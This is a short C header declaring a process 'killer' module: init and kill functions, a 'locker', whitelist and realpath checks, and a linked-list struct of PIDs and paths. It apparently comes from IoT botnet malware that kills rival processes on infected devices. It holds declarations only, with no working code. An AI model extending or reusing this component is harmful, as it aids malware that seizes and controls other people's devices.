#pragma once
int killer_pid;

void locker();
void killer_init(char *);
void killer_kill(void);
char check_whitelisted(char *);
char *check_realpath(char *, char *);

typedef struct kill_t  {
    struct kill_t *next;

    unsigned int n_pid;
    char pid[256], path[256];
} Kill;

extern char *whitlistpaths[];
